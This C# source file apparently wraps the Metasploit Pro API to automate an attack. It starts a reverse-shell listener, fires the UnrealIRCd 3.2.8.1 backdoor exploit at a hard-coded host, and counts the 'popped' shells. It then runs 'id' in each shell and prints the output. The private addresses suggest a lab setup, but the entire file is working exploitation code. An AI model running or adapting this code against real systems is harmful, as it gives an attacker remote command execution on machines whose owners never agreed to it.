using System;
using System.Collections.Generic;
using Lacey.Alexa.Common.Metasploit.Manager;
using Microsoft.Extensions.Logging;

namespace Lacey.Alexa.Common.Metasploit.Providers.Concrete
{
    public sealed class MetasploitProvider : IMetasploitProvider, IDisposable
    {
        private readonly ILogger _logger;

        private readonly MetasploitSession _session;

        private readonly MetasploitManager _metasploit;

        public MetasploitProvider(
            string metasploitUrl, 
            IMetasploitAuthProvider authProvider, 
            ILogger logger)
        {
            _logger = logger;

            var creds = authProvider.GetUserSecrets();
            _session = new MetasploitSession(creds.Username, creds.Password, $"{metasploitUrl}/api/");
            _metasploit = new MetasploitProManager(_session);
        }

        public Dictionary<string, object> Unreal_Ircd_3281_Backdoor()
        {
            Dictionary<string, object> response = null;

            var blah = new Dictionary<string, object>
            {
                ["ExitOnSession"] = "false",
                ["PAYLOAD"] = "cmd/unix/reverse",
                ["LHOST"] = "192.168.0.12",
                ["LPORT"] = "4444"
            };

            response = _metasploit.ExecuteModule("exploit", "multi/handler", blah);

            var jobId = response["job_id"];
            var opts = new Dictionary<string, object>
            {
                ["RHOST"] = "192.168.0.13",
                ["DisablePayloadHandler"] = "true",
                ["LHOST"] = "192.168.0.12",
                ["LPORT"] = "4444",
                ["PAYLOAD"] = "cmd/unix/reverse"
            };

            response = _metasploit.ExecuteModule("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts);

            response = _metasploit.ListJobs();
            var vals = new List<object>(response.Values);
            while (vals.Contains((object)"Exploit: unix/irc/unreal_ircd_3281_backdoor"))
            {
                Console.WriteLine("Waiting");
                System.Threading.Thread.Sleep(6000);
                response = _metasploit.ListJobs();
                vals = new List<object>(response.Values);
            }


            response = _metasploit.StopJob(jobId.ToString());
            response = _metasploit.ListSessions();
            
            Console.WriteLine("I popped " + response.Count + " shells. Awesome.");

			foreach (var pair in response) {
				var id = pair.Key;
				var dict = (Dictionary<string, object>)pair.Value;
				if (dict["type"] as string == "shell") {
					response = _metasploit.WriteToSessionShell(id, "id\n");
					System.Threading.Thread.Sleep(6000);
					response = _metasploit.ReadSessionShell(id);
                    Console.WriteLine(response["data"]);
			
					_metasploit.StopSession(id);
				}
			}

            var bl = _metasploit.GetModuleCompatibleSessions("multi/general/execute");
            Console.WriteLine("fdsa");

            return response;
        }

        public void Dispose()
        {
            _metasploit.Dispose();
            _session.Dispose();
        }
    }
}